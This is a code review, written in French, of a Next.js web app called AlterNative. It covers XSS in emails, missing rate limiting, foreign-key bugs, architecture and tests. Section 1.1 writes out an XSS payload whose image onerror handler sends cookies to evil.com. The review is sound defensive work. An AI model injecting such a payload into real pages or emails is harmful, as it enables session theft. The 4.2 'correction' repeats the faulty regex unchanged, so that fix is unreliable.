# Revue de code — AlterNative

> Revue réalisée sur la base du code source complet du projet (Next.js 16 / App Router, Drizzle ORM, Better Auth, Zod, Tailwind v4, Vercel).

---

## Ce qui fonctionne bien

Avant d'entrer dans les critiques, il est honnête de noter ce que le projet fait correctement :

- Architecture App Router cohérente (server components, server actions, pas de client inutile)
- Validation Zod centralisée dans un seul fichier avec types inférés
- Schéma DB propre avec Drizzle, relations correctement déclarées
- Mode sombre sans flash d'écran (script inline + `suppressHydrationWarning`)
- Emails transactionnels en best-effort (non bloquants)
- Tests unitaires présents sur toute la couche de validation

---

## 1. Sécurité

### 1.1 XSS dans les emails — Critique

**Fichier :** `src/lib/email.ts`

Les données utilisateur sont interpolées directement dans des chaînes HTML sans aucun échappement :

```ts
// name, title, editorNote, reason viennent tous de la DB (donc de l'utilisateur)
html: `<h1>Bienvenue, ${name} !</h1>`
html: `<strong>${title}</strong>`
html: `<blockquote>${editorNote}</blockquote>`
html: `<blockquote>${reason}</blockquote>`
```

**Conséquence :** Un utilisateur qui s'inscrit avec le nom `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` injecte du HTML arbitraire dans l'email envoyé. Le `editorNote` rédigé par l'admin est tout aussi vulnérable.

**Correction :**

```ts
function escapeHtml(str: string) {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

// Puis :
html: `<h1>Bienvenue, ${escapeHtml(name)} !</h1>`
```

---

### 1.2 Pas de rate limiting

Aucune limitation du nombre de tentatives sur :
- `signinAction` → brute force de mots de passe possible
- `signupAction` → création en masse de comptes
- `commentPublicationAction` → spam de commentaires
- `submitManuscriptAction` → flood de soumissions

**Correction :** Utiliser un middleware de rate limiting (ex: `@upstash/ratelimit` avec Redis/KV Vercel) sur ces routes.

---

### 1.3 `BETTER_AUTH_SECRET` sans vérification

**Fichier :** `src/lib/auth.ts:20`

```ts
secret: process.env.BETTER_AUTH_SECRET,  // peut être undefined
```

Contrairement à `DATABASE_URL` qui lève une erreur si absent (`src/lib/db.ts:5`), le secret d'auth n'est pas vérifié. Better Auth utilisera un fallback ou signera les sessions avec une valeur dégradée.

**Correction :**

```ts
if (!process.env.BETTER_AUTH_SECRET) {
  throw new Error("BETTER_AUTH_SECRET is not defined");
}
```

---

### 1.4 Email non vérifié à l'inscription

**Fichier :** `src/lib/auth.ts:15`

```ts
requireEmailVerification: false,
```

N'importe qui peut s'inscrire avec l'adresse email de quelqu'un d'autre. La personne visée reçoit un email de bienvenue sans avoir rien demandé.

---

### 1.5 L'ID utilisateur est exposé publiquement

**Fichier :** `src/components/SessionPanel.tsx:30`

```tsx
<p className="editorial-muted">ID : {session.user.id}</p>
```

L'ID interne de l'utilisateur (chaîne Better Auth) est affiché sur la page d'accueil pour tout utilisateur connecté. C'est une donnée interne qui ne doit pas être exposée.

---

### 1.6 `trustedOrigins` et URL de prod codées en dur

**Fichier :** `src/lib/auth.ts:21`

```ts
trustedOrigins: ["http://localhost:3000", "https://demo-day-wine.vercel.app"],
```

L'URL de production est dans le code source. Si le projet est déployé sur un autre domaine ou renommé, cette liste doit être mise à jour manuellement — et oubliée.

**Correction :**

```ts
trustedOrigins: [
  "http://localhost:3000",
  process.env.NEXT_PUBLIC_APP_URL,
].filter(Boolean),
```

---

## 2. Bugs

### 2.1 `unpublishAction` échoue si la publication a des commentaires ou des notes

**Fichier :** `src/lib/actions/admin.ts:152`

```ts
await db.delete(publications).where(eq(publications.id, publicationId));
```

Le schéma déclare des FK sur `comments.publication_id` et `ratings.publication_id` **sans** `onDelete: cascade`. PostgreSQL va donc refuser la suppression avec une erreur FK si la publication a au moins un commentaire ou une note. L'action ne retourne rien dans ce cas, le bug est silencieux côté admin.

**Corrections possibles :**

Option A — ajouter le cascade dans le schéma :
```ts
publicationId: integer("publication_id")
  .notNull()
  .references(() => publications.id, { onDelete: "cascade" }),
```

Option B — supprimer manuellement les dépendances avant la publication :
```ts
await db.delete(comments).where(eq(comments.publicationId, publicationId));
await db.delete(ratings).where(eq(ratings.publicationId, publicationId));
await db.delete(publications).where(eq(publications.id, publicationId));
```

---

### 2.2 Pool de connexions limité à 1 en serverless

**Fichier :** `src/lib/db.ts:9`

```ts
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  max: 1,
});
```

Sur Vercel (fonctions serverless), chaque invocation instancie un nouveau pool. Avec `max: 1` :
- Les requêtes concurrentes dans une même invocation se mettent en file d'attente
- Neon limite le nombre de connexions simultanées — des pics de trafic peuvent épuiser le quota

**Correction :** Utiliser le driver serverless Neon, conçu pour ce contexte :

```ts
import { neon } from "@neondatabase/serverless";
import { drizzle } from "drizzle-orm/neon-http";
import * as schema from "@/db/schema";

const sql = neon(process.env.DATABASE_URL!);
export const db = drizzle(sql, { schema });
```

---

### 2.3 La validation des actions admin est incomplète

**Fichier :** `src/lib/actions/admin.ts:40`

`acceptManuscriptAction` récupère `pitch` et `editorNote` depuis le FormData sans contrainte de longueur. Un pitch de 100 000 caractères serait stocké tel quel en base. La colonne `pitch` est de type `text` (illimitée), ce qui est intentionnel, mais une borne raisonnable devrait être appliquée côté serveur, indépendamment de l'UI.

---

### 2.4 `unpublishAction` : la recherche du manuscrit associé est fragile

**Fichier :** `src/lib/actions/admin.ts:155`

```ts
const relatedManuscript = await db.query.manuscripts.findFirst({
  where: (m, { and, eq: eqFn }) =>
    and(eqFn(m.authorId, pub.authorId), eqFn(m.title, pub.title), eqFn(m.status, "accepted")),
});
```

La correspondance publication → manuscrit se fait par `(authorId, title)`. Si le titre contient une coquille corrigée entre la soumission et l'acceptation, ou si deux manuscrits du même auteur ont le même titre, la correspondance échoue ou est incorrecte. La bonne relation à stocker est l'ID du manuscrit source directement sur la publication.

---

## 3. Architecture

### 3.1 Protection des routes par copier-coller

Chaque page protégée contient la même séquence :

```ts
const session = await auth.api.getSession({ headers: await headers() }).catch(() => null);
if (!session) redirect("/signin");
```

Ce pattern est répété dans `dashboard/page.tsx`, `manuscripts/submit/page.tsx`, `admin/page.tsx`. Si la logique de protection change (ex: ajout d'une vérification de ban), il faut modifier chaque page.

**Correction :** Créer un fichier `src/middleware.ts` qui intercepte les routes protégées :

```ts
import { NextRequest, NextResponse } from "next/server";
import { getSessionCookie } from "better-auth/cookies";

export function middleware(request: NextRequest) {
  const session = getSessionCookie(request);
  if (!session) {
    return NextResponse.redirect(new URL("/signin", request.url));
  }
}

export const config = {
  matcher: ["/dashboard/:path*", "/manuscripts/:path*"],
};
```

---

### 3.2 `requireAdmin()` effectue 2 requêtes DB à chaque action admin

**Fichier :** `src/lib/actions/admin.ts:15`

```ts
async function requireAdmin() {
  const session = await auth.api.getSession(...);
  if (!session) redirect("/signin");

  const user = await db.query.users.findFirst({    // 2e requête
    where: eq(users.id, session.user.id),
  });
  if (user?.role !== "admin") redirect("/");
}
```

Le rôle est dans la table `users` mais pas dans l'objet session Better Auth. L'approche la plus propre est d'utiliser les plugins Better Auth pour étendre la session avec le rôle utilisateur, ou de stocker le rôle dans un champ de session personnalisé.

---

### 3.3 Features implémentées mais jamais exposées

Deux systèmes entiers existent dans le schéma et la validation mais aucune page ne les utilise :

- **Notifications** : table `notifications`, insertions dans `acceptManuscriptAction` et `rejectManuscriptAction`, mais zéro interface utilisateur.
- **Signalements** : table `reports`, `reportSchema` dans `validation.ts`, mais aucune action serveur ni aucune UI.

Ce code mort charge le schéma DB et la surface mentale du projet sans valeur pour l'utilisateur.

---

### 3.4 Pas d'Error Boundary

Si une requête DB lève une exception non gérée dans un server component (ex: timeout Neon, coupure réseau), Next.js affiche la page d'erreur générique. Implémenter des `error.tsx` par segment permettrait d'afficher un message adapté sans perdre toute la page.

---

## 4. Qualité du code

### 4.1 L'adresse expéditeur des emails est le domaine sandbox Resend

**Fichier :** `src/lib/email.ts:5`

```ts
const FROM = "AlterNative <onboarding@resend.dev>";
```

`onboarding@resend.dev` est le domaine de test Resend. En production, les emails envoyés depuis ce domaine :
- Ne peuvent être envoyés qu'aux adresses vérifiées dans le dashboard Resend (plan gratuit)
- Arrivent souvent en spam
- Ne peuvent pas être répondus

Il faut configurer un vrai domaine (ex: `noreply@ton-domaine.fr`) dans Resend et remplacer cette constante.

---

### 4.2 La regex `slugify` utilise des caractères invisibles

**Fichier :** `src/lib/actions/admin.ts:35`

```ts
.replace(/[̀-ͯ]/g, "")
```

Les caractères dans la classe `[̀-ͯ]` sont des points de code Unicode invisibles dans la plupart des éditeurs. Cela provoque des surprises à la lecture et des erreurs d'encodage possibles selon les outils.

**Correction explicite :**

```ts
.replace(/[̀-ͯ]/g, "")
```

---

### 4.3 `isNew` dans la query homepage est inutilement complexe

**Fichier :** `src/app/page.tsx:26`

```ts
isNew: sql<boolean>`${gt(publications.publishedAt, sql`now() - interval '7 days'`)}`,
```

La fonction `gt()` est enveloppée dans un `sql\`\`` redondant. La forme lisible :

```ts
isNew: sql<boolean>`${publications.publishedAt} > now() - interval '7 days'`,
```

---

### 4.4 Le script de migration ne se charge pas de l'env

Comme documenté lors de l'incident de migration, `drizzle-kit migrate` ne charge pas `.env.local` en dehors du contexte Next.js. La commande `npm run db:migrate` peut s'exécuter sans erreur visible tout en ne faisant rien.

**Correction dans `package.json` :**

```json
"db:migrate": "dotenv -e .env.local -- drizzle-kit migrate"
```

(Nécessite `npm install -D dotenv-cli`)

---

### 4.5 Couverture de tests trop faible

Les tests couvrent uniquement les schemas Zod. Aucun test ne couvre :
- Les server actions (comportement en cas de session nulle, ID invalide, etc.)
- Les requêtes DB (mocks ou DB de test)
- Le comportement des composants

Pour un projet en production, les server actions sont la couche la plus critique à tester : ce sont elles qui modifient les données.

---

## Récapitulatif par priorité

| Priorité | Problème | Fichier |
|---|---|---|
| 🔴 Critique | XSS dans les emails | `email.ts` |
| 🔴 Critique | `unpublishAction` : violation FK silencieuse | `actions/admin.ts` |
| 🟠 Élevée | Pas de rate limiting | `actions/auth.ts`, `actions/publication-interactions.ts` |
| 🟠 Élevée | Pool DB `max: 1` en serverless | `lib/db.ts` |
| 🟠 Élevée | `BETTER_AUTH_SECRET` non vérifié | `lib/auth.ts` |
| 🟡 Moyenne | Protection des routes par copier-coller | toutes les pages protégées |
| 🟡 Moyenne | ID utilisateur exposé publiquement | `SessionPanel.tsx` |
| 🟡 Moyenne | `trustedOrigins` codé en dur | `lib/auth.ts` |
| 🟡 Moyenne | Domaine sandbox Resend en prod | `lib/email.ts` |
| 🔵 Faible | Email non vérifié à l'inscription | `lib/auth.ts` |
| 🔵 Faible | Regex slugify avec caractères invisibles | `actions/admin.ts` |
| 🔵 Faible | Features mortes (notifications, signalements) | `schema.ts`, `validation.ts` |
| 🔵 Faible | Couverture de tests insuffisante | `validation.test.ts` |
